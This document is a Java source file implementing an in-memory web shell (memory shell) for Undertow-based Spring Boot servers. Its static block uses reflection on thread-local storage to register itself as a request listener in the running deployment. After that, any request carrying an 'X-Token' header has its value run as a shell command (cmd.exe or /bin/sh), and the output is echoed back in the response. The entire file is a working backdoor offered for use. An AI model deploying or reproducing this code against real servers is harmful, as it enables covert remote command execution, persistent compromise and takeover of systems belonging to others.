package com.example.undertow.memshell;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-undertow
 * 2.7.15
 */
public class UndertowListenerExecMS implements ServletRequestListener {
    private static String header = "X-Token";

    static {
        try {
            UndertowListenerExecMS undertowListenerExecMS = new UndertowListenerExecMS();

            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                try {
                    if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
                        Object deployment = getFieldValue(value, "deployment");
                        Object applicationListeners = getFieldValue(deployment, "applicationListeners");
                        Object managedListener = Class.forName("io.undertow.servlet.core.ManagedListener").getConstructor(listenerInfoClass, Boolean.TYPE).newInstance(listenerInfoClass.getConstructor(Class.class).newInstance(undertowListenerExecMS.getClass()), true);
                        applicationListeners.getClass().getDeclaredMethod("addListener", Class.forName("io.undertow.servlet.core.ManagedListener")).invoke(applicationListeners, managedListener);
                        break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void requestInitialized(ServletRequestEvent sre) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) sre.getServletRequest();
            HttpServletResponse httpServletResponse = getResponse(httpServletRequest);

            String cmd = httpServletRequest.getHeader(header);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            httpServletResponse.getWriter().println(result);
        } catch (Exception e) {
        }
    }

    public void requestDestroyed(ServletRequestEvent sre) {

    }


    public HttpServletResponse getResponse(Object httpServletRequest) {
        HttpServletResponse httpServletResponse = null;
        try {
            Object exchange = getFieldValue(httpServletRequest, "exchange");
            Map attachments = (Map) getFieldValue(exchange, "attachments");
            Object[] tables = (Object[]) getFieldValue(attachments, "table");
            for (int i = 0; i < tables.length; i++) {
                try {
                    Object table = tables[i];
                    if (table == null)
                        continue;
                    if (table.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        httpServletResponse = (HttpServletResponse) getFieldValue(table, "originalResponse");
                        break;
                    }
                } catch (Exception e) {
                }
            }
//            Object[] tables = attachments.keySet().toArray();
//            for (int i = 0; i < tables.length; i++) {
//                try {
//                    Object table = tables[i];
//                    if (attachments.get(table).toString().contains("ServletRequestContext")) {
//                        httpServletResponse = (HttpServletResponse)getFieldValue(attachments.get(table), "servletResponse");
//                        break;
//                    }
//                } catch (Exception e) {
//                }
//            }
        } catch (Exception e) {
        }
        return httpServletResponse;
    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
